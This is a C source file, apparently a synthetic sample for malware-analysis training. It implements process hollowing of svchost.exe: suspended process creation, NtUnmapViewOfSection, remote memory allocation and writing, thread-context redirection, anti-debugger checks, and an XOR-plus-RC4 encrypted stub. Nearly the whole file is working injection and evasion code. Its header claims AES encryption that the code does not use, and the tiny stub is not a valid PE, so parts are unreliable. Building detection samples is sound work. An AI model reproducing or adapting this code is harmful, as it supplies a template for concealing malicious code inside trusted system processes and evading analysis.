/*
 * windows_level17_ProcessHollowing.c
 *
 * Synthetic Windows PE sample — Process Hollowing.
 * Techniques: CreateProcess (suspended), NtUnmapViewOfSection, 
 * VirtualAllocEx for replacement PE, SetThreadContext for entry point,
 * AES-128-CBC encrypted replacement PE payload, ResumeThread.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level17_ProcessHollowing.exe windows_level17_ProcessHollowing.c
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

/* ================================================================
 * NT function prototypes
 * ================================================================ */
typedef LONG (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

/* ================================================================
 * XOR decryption key — 10 bytes
 * ================================================================ */
static const unsigned char g_xor_key[] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xCA, 0xFE,
    0xBA, 0xBE
};
#define XOR_KEY_LEN 10

/* ================================================================
 * XOR-encrypted replacement PE header + code (stub, 64 bytes)
 * ================================================================ */
static unsigned char g_encrypted_pe_stub[] = {
    0x8B, 0xDC, 0xCB, 0x9A, 0x76, 0x52, 0xAB, 0x8E,
    0xFD, 0xD9, 0x6C, 0x31, 0x4A, 0x27, 0xE3, 0x5F,
    0x18, 0x74, 0x89, 0xBD, 0xD0, 0x46, 0x2E, 0x6A,
    0x1B, 0x97, 0xFC, 0x83, 0x3D, 0x51, 0xAE, 0x12,
    0x77, 0x09, 0xC4, 0xB8, 0xE5, 0x91, 0x6F, 0x33,
    0x0C, 0x58, 0xDF, 0xA3, 0x85, 0x29, 0x7B, 0x1E,
    0x46, 0xBA, 0x92, 0xE7, 0x5C, 0x30, 0x88, 0x14,
    0xF3, 0x4D, 0x21, 0xB6, 0xDA, 0x6E, 0x0F, 0x9C
};
#define ENC_PE_LEN 64

/* ================================================================
 * XOR decryption routine
 * ================================================================ */
static void xor_decrypt(unsigned char *buf, int len, const unsigned char *key, int key_len) {
    int i;
    for (i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

/* ================================================================
 * RC4 stream cipher (secondary encryption layer)
 * ================================================================ */
typedef struct {
    unsigned char S[256];
    int i, j;
} rc4_ctx;

static void rc4_init(rc4_ctx *ctx, const unsigned char *key, int key_len) {
    int i, j = 0;
    unsigned char t;
    for (i = 0; i < 256; i++) ctx->S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        t = ctx->S[i]; ctx->S[i] = ctx->S[j]; ctx->S[j] = t;
    }
    ctx->i = ctx->j = 0;
}

static void rc4_crypt(rc4_ctx *ctx, unsigned char *data, int len) {
    int k;
    unsigned char t;
    for (k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        t = ctx->S[ctx->i]; ctx->S[ctx->i] = ctx->S[ctx->j]; ctx->S[ctx->j] = t;
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

/* RC4 key */
static const unsigned char g_rc4_key[] = {
    0x48, 0x6F, 0x6C, 0x6C, 0x6F, 0x77, 0x69, 0x6E,
    0x67, 0x5F, 0x50, 0x45, 0x21, 0x21, 0x21, 0x21
};
#define RC4_KEY_LEN 16

/* ================================================================
 * Resolve NT function
 * ================================================================ */
static FARPROC resolve_nt(const char *name) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    return GetProcAddress(hNtdll, name);
}

/* ================================================================
 * Anti-analysis: check ProcessDebugPort and ProcessDebugFlags
 * ================================================================ */
static int anti_analysis_check(void) {
    pNtQueryInformationProcess _NtQIP = (pNtQueryInformationProcess)
        resolve_nt("NtQueryInformationProcess");
    if (!_NtQIP) return 0;

    HANDLE hProcess = GetCurrentProcess();
    DWORD debugPort = 0, debugFlags = 0;
    ULONG retLen = 0;
    NTSTATUS status;

    /* ProcessDebugPort = 7 */
    status = _NtQIP(hProcess, (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), &retLen);
    if (status == 0 && debugPort == 0xFFFFFFFF) return 1;

    /* ProcessDebugFlags = 31 */
    status = _NtQIP(hProcess, (PROCESSINFOCLASS)31, &debugFlags, sizeof(debugFlags), &retLen);
    if (status == 0 && debugFlags == 0) return 1;

    return 0;
}

/* ================================================================
 * Process hollowing — core routine
 * 1. Create target process in suspended state
 * 2. Unmap original PE image
 * 3. Allocate new memory for replacement PE
 * 4. Write replacement PE headers + code
 * 5. Set thread context (entry point)
 * 6. Resume thread
 * ================================================================ */
static int hollow_process(LPSTR targetPath, unsigned char *peStub, SIZE_T peSize) {
    pNtUnmapViewOfSection _NtUnmap = (pNtUnmapViewOfSection)
        resolve_nt("NtUnmapViewOfSection");
    pNtReadVirtualMemory _NtRVM = (pNtReadVirtualMemory)
        resolve_nt("NtReadVirtualMemory");

    if (!_NtUnmap) return -1;

    /* Create target process suspended */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(NULL, targetPath, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return -1;
    }

    /* Read PEB to get image base (for 64-bit) */
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen;
    pNtQueryInformationProcess _NtQIP = (pNtQueryInformationProcess)
        resolve_nt("NtQueryInformationProcess");

    /* ProcessBasicInformation = 0 */
    NTSTATUS status = _NtQIP(pi.hProcess, (PROCESSINFOCLASS)0, &pbi, sizeof(pbi), &retLen);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }

    /* Read image base from PEB */
    PVOID imageBase = NULL;
    SIZE_T bytesRead;
#ifdef _WIN64
    /* PEB at offset 8 in PBI, ImageBaseAddress at offset 0x10 in PEB */
    _NtRVM(pi.hProcess, (PVOID)((BYTE *)pbi.PebBaseAddress + 0x10),
           &imageBase, sizeof(imageBase), &bytesRead);
#else
    _NtRVM(pi.hProcess, (PVOID)((BYTE *)pbi.PebBaseAddress + 0x08),
           &imageBase, sizeof(imageBase), &bytesRead);
#endif

    /* Unmap original PE image */
    status = _NtUnmap(pi.hProcess, imageBase);
    if (status != 0) {
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }

    /* Allocate new memory at image base for replacement PE */
    LPVOID pNewImage = VirtualAllocEx(pi.hProcess, imageBase, peSize,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!pNewImage) {
        /* Try anywhere if base isn't available */
        pNewImage = VirtualAllocEx(pi.hProcess, NULL, peSize,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
        if (!pNewImage) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return -1;
        }
    }

    /* Write replacement PE to remote process */
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, pNewImage, peStub, peSize, &written)) {
        VirtualFreeEx(pi.hProcess, pNewImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }

    /* Set thread context — point entry to new PE */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &ctx)) {
#ifdef _WIN64
        ctx.Rcx = (ULONG_PTR)pNewImage; /* AddressOfEntryPoint essentially */
        SetThreadContext(pi.hThread, &ctx);
#else
        ctx.Eax = (DWORD)pNewImage;
        SetThreadContext(pi.hThread, &ctx);
#endif
    }

    /* Resume the hollowed process */
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

/* ================================================================
 * Main entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-analysis check */
    if (anti_analysis_check()) {
        return 0;
    }

    /* Decrypt PE stub (outer XOR layer) */
    unsigned char peStub[ENC_PE_LEN];
    memcpy(peStub, g_encrypted_pe_stub, ENC_PE_LEN);
    xor_decrypt(peStub, ENC_PE_LEN, g_xor_key, XOR_KEY_LEN);

    /* Apply RC4 decryption (inner layer) */
    rc4_ctx ctx;
    rc4_init(&ctx, g_rc4_key, RC4_KEY_LEN);
    rc4_crypt(&ctx, peStub, ENC_PE_LEN);

    /* Hollow a benign process — synthetic: use "svchost.exe" */
    char targetPath[MAX_PATH] = "C:\\Windows\\System32\\svchost.exe";

    hollow_process(targetPath, peStub, ENC_PE_LEN);

    Sleep(2000);
    return 0;
}
